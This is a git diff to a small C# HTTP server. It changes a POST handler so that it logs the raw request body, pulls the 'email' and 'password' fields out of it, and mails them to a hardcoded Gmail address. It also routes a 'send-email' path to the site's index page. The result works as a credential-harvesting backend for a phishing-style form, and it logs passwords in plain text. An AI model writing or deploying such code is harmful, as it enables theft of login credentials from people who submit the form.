@@ -1,5 +1,6 @@
 ﻿using System.Net;
 using System.Text;
+using MyHTTPServer.Services;
 
 namespace MyHTTPServer;
 
@@ -64,11 +65,14 @@ public static class ServerManager
                         var stream = new StreamReader(request.InputStream);
                         var input = await stream.ReadToEndAsync();
 
-                        string[] parsedInput = input.Split("&");
-                        Server.SendEmailAsync(parsedInput[0], parsedInput[1]);
+                        var sender = ConfigLoader.EmailSender;
+                        Console.WriteLine(input);
+                        string[] parsedInput = input.Split(new [] {'&', '='});
+                        await sender.SendEmailAsync("eminsarux.rik79@gmail.com", "test", 
+                            $"email: {parsedInput[1]}, password: {parsedInput[3]}");
                     }
-
-                    if (desiredPath == "static/")
+                    
+                    if (desiredPath == "static/" || desiredPath == "static/send-email")
                         contentBytes = File.ReadAllBytes($"./{config.StaticFilesPath}/index.html");
                     
                     else if (desiredPath.EndsWith(".html"))
